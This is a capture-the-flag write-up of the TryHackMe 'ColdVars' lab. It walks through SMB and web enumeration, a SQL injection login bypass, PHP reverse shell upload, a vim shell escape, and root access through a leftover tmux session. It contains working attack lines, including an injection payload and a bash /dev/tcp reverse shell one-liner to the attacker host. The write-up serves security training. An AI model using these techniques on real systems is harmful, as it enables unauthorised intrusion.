# TryHackMe: ColdVars Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-green)

A complete walkthrough of the **ColdVars** machine on TryHackMe. This writeup documents the reconnaissance, SMB and web enumeration, SQL injection in a login form, credential reuse across services, file upload to remote code execution, a shell escape from a custom menu application, and privilege escalation through a root session retained in a tmux instance.

---

## Table of Contents

- [Overview](#overview)
- [Environment](#environment)
- [Attack Summary](#attack-summary)
- [1. Reconnaissance](#1-reconnaissance)
- [2. SMB Enumeration](#2-smb-enumeration)
- [3. Web Enumeration](#3-web-enumeration)
- [4. SQL Injection](#4-sql-injection)
- [5. Authenticated SMB Access](#5-authenticated-smb-access)
- [6. Initial Access](#6-initial-access)
- [7. Lateral Movement](#7-lateral-movement)
- [8. Privilege Escalation](#8-privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

| Field        | Value                                  |
|--------------|----------------------------------------|
| Machine      | ColdVars                               |
| Platform     | TryHackMe                              |
| Difficulty   | Medium                                 |
| Target IP    | `10.48.178.132`                        |
| OS           | Ubuntu Linux 20.04                     |
| Services     | OpenSSH 8.2p1, Samba 4.6.2, Apache 2.4.41, Node.js (Express) |
| Objective    | Obtain `user.txt` and `root.txt`       |

---

## Environment

| Component         | Details                       |
|-------------------|-------------------------------|
| Attacker Machine  | Kali Linux                    |
| Attacker IP       | `192.168.136.156`             |
| Target            | `10.48.178.132`               |

---

## Attack Summary

The attack chain progresses through the following stages:

1. **Port scanning** revealed SSH, SMB (139 and 445), and two web services on ports 8080 and 8082.
2. **SMB enumeration** confirmed a share named `SECURED` that required authentication.
3. **Web enumeration** on port 8080 identified a `/dev/` directory containing a login page and a note.
4. **SQL injection** in the login form disclosed a list of usernames and passwords.
5. **Authenticated SMB access** with one of the recovered accounts exposed a note describing a file upload feature.
6. **Remote code execution** was achieved by uploading a PHP reverse shell, giving a shell as `www-data`.
7. **Credential reuse** allowed SSH access as `ArthurMorgan`.
8. **Lateral movement** to `marston` used a shell escape from a custom menu application running on localhost port 4545.
9. **Privilege escalation** to root came from a root session running in a tmux instance, retrieved after reviewing shell history.

---

## 1. Reconnaissance

### 1.1 Full TCP Port Scan

```bash
nmap -p- -v 10.48.178.132
```

**Results:**

| Port | State | Service       | Notes                          |
|------|-------|---------------|--------------------------------|
| 22   | open  | ssh           | OpenSSH 8.2p1 (Ubuntu)         |
| 139  | open  | netbios-ssn   | Samba smbd 4.6.2               |
| 445  | open  | microsoft-ds  | Samba smbd 4.6.2               |
| 8080 | open  | http-proxy    | Apache httpd 2.4.41            |
| 8082 | open  | blackice-alerts | Node.js (Express framework) |

### 1.2 Service and Version Detection

```bash
nmap -sC -sV -p 22,139,445,8080,8082 10.48.178.132
```

Key findings:

- **SMB (139, 445):** Samba 4.6.2 with message signing enabled but not required.
- **Port 8080:** Apache default page, with a hidden `/dev/` directory discovered later.
- **Port 8082:** Node.js Express application with a custom page.
- **SSH (22):** OpenSSH 8.2p1, a potential target once valid credentials are found.

---

## 2. SMB Enumeration

### 2.1 Automated Enumeration

```bash
enum4linux-ng -A 10.48.178.132
```

The automated scan returned little information without credentials.

### 2.2 Listing Shares

```bash
smbclient -L 10.48.178.132 -N
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SECURED         Disk      Dev
        IPC$            IPC       IPC Service (ip-10-48-178-132 server (Samba, Ubuntu))
```

The `SECURED` share required authentication, so it was set aside until credentials were available.

---

## 3. Web Enumeration

### 3.1 Initial Review

Both web ports were checked in the browser. Port 8080 showed the Apache default page, and port 8082 displayed a themed website. No content of interest was visible on either site's landing page.

### 3.2 Directory Enumeration

```bash
gobuster dir -u http://10.48.178.132:8080/dev/ \
             -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt \
             -x php,html,txt,sql,bak,json,xml
```

```
/note.txt             (Status: 200) [Size: 45]
```

The `/dev/` directory on port 8080 contained a login page. The `note.txt` file contained little information on its own.

---

## 4. SQL Injection

### 4.1 Identifying the Vulnerability

The login form was tested with a classic boolean-based injection in the username field. The payload is shown below in its decoded form, with the URL-encoded version as it was submitted:

```
admin" or 1=1 or ""="
admin%22or%201%3d1%20or%20%22%22%3d%22
```

The payload altered the query logic so that the authentication check evaluated to true, which granted access to the page.

### 4.2 Recovered Credentials

The page then displayed a list of usernames and passwords:

| Username     | Password       |
|--------------|----------------|
| Tove         | Jani           |
| Godzilla     | KONGistheKING  |
| SuperMan     | snyderCut      |
| ArthurMorgan | DeadEye        |

> These are lab credentials. The values are shown here only because they form part of the attack chain.

---

## 5. Authenticated SMB Access

The recovered credentials were tested against the SMB share. The account `ArthurMorgan` provided access to the `SECURED` share:

```bash
smbclient //10.48.178.132/SECURED -U ArthurMorgan
```

```
smb: \> ls
  .                                   D        0  Sun Mar 21 23:04:28 2021
  ..                                  D        0  Thu Mar 11 12:52:29 2021
  note.txt                            N       45  Thu Mar 11 12:19:52 2021
smb: \> get note.txt
```

```bash
cat note.txt
```

```
Secure File Upload and Testing Functionality
```

The note indicated that a file upload feature existed and was under test, which pointed to the next stage of the attack.

---

## 6. Initial Access

### 6.1 Uploading a PHP Reverse Shell

A PHP reverse shell from the Pentest Monkey collection was uploaded through the file upload feature. Requesting the uploaded file caused it to execute and connect back to the attacker machine.

A listener was started on the attacker machine:

```bash
nc -lvnp 5555
```

```
connect to [192.168.136.156] from (UNKNOWN) [10.48.178.132] 37168
Linux ip-10-48-178-132 5.15.0-139-generic #149~20.04.1-Ubuntu SMP x86_64 GNU/Linux
```

### 6.2 Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the listener
stty raw -echo
fg
export TERM=xterm
```

### 6.3 Home Directory Review

```bash
cd /home/ArthurMorgan
ls
# ideas  user.txt
cat user.txt
```

---

## 7. Lateral Movement

### 7.1 Credential Reuse over SSH

The password recovered from the SQL injection was reused for the `ArthurMorgan` system account. The SSH service accepted the login:

```bash
ssh ArthurMorgan@10.48.178.132
```

```bash
$ /bin/bash
ArthurMorgan@ip-10-48-178-132:~$
```

### 7.2 Discovering a Local Service

Listening sockets were enumerated to identify services that are not exposed externally:

```bash
netstat -tulnp
```

The output showed a service listening on **127.0.0.1:4545**. It was reached from the `ArthurMorgan` shell with netcat, which returned a menu application named **ideaBox**:

```
ideaBox
1. Write
2. Delete
3. Steal others' Trash
4. Show'n Exit
```

### 7.3 Shell Escape from the Menu

Option 4 opened the application's pager, which runs inside `vim`. From `vim`, the `:shell` command spawns a system shell, as documented on GTFOBins. This gave a shell as `marston`:

```
:shell
id
uid=1002(marston) gid=1003(marston) groups=1003(marston)
```

### 7.4 Reverse Shell as marston

A stable reverse shell was started from the `marston` shell:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.136.156/4444 0>&1'
```

```bash
nc -lvnp 4444
```

```
connect to [192.168.136.156] from (UNKNOWN) [10.48.178.132] 52814
marston@ip-10-48-178-132:~$
```

---

## 8. Privilege Escalation

### 8.1 Identifying tmux Sessions

Process listing revealed several `tmux` sessions running in the background:

```bash
ps -eaf --forest
```

Each session can be attached to with `tmux attach-session -t <name>`. The sessions were reviewed one at a time, and exiting the earlier sessions eventually revealed a session running as root.

### 8.2 Reviewing Shell History

The shell history inside each tmux session was reviewed. One session contained a command that connected to the local SSH service as root using a stored password:

```bash
sshpass -p '<redacted>' ssh root@localhost
```

The password is not reproduced in this public writeup.

### 8.3 Root Access

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
ls
# root.txt  snap
cat root.txt
```

---

## Flags

| Flag        | Location                              | Value         |
|-------------|---------------------------------------|---------------|
| `user.txt`  | `/home/ArthurMorgan/user.txt`         | `<user-flag>` |
| `root.txt`  | `/root/root.txt`                      | `<root-flag>` |

> Flag values are intentionally omitted from this public writeup in accordance with TryHackMe guidelines.

---

## Lessons Learned

- **Parameterise all database queries.** The login form concatenated user input directly into its SQL statement, which allowed authentication to be bypassed and credentials to be dumped.
- **Do not display stored credentials in application pages.** The login page revealed a full list of usernames and passwords after the injection succeeded.
- **Prevent password reuse across services.** The web application password also granted SSH access to a system account.
- **Restrict file upload functionality.** Allowing arbitrary PHP files to be uploaded and executed gave immediate remote code execution.
- **Do not expose interactive applications on localhost without access control.** The menu application allowed an escape to a shell through its pager.
- **Keep privileged sessions out of persistent terminal multiplexers.** Root sessions left running in tmux, together with shell history containing passwords, provided a direct path to full compromise.
- **Never place passwords in command-line arguments or shell history.** Tools such as `sshpass` expose credentials in process listings and history files.

---

## Tools Used

| Tool        | Purpose                                              |
|-------------|------------------------------------------------------|
| Nmap        | Port scanning and service fingerprinting             |
| enum4linux-ng | SMB enumeration                                    |
| smbclient   | Share listing and file retrieval                     |
| Gobuster    | Web directory enumeration                            |
| Burp Suite  | Intercepting and testing login requests              |
| Netcat      | Reverse shell listeners and local service access     |
| tmux        | Inspecting background privileged sessions            |
| sshpass     | Non-interactive SSH authentication (found in history)|

---

## References

- [TryHackMe: ColdVars](https://tryhackme.com/)
- [GTFOBins: vim](https://gtfobins.github.io/gtfobins/vim/)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [tmux Manual](https://man.openbsd.org/tmux)

---

## Disclaimer

This writeup is intended solely for educational purposes and was performed in a legal, authorized lab environment provided by TryHackMe. The techniques described should only be used against systems where you have explicit written permission to test.

# Jai Shri Ram
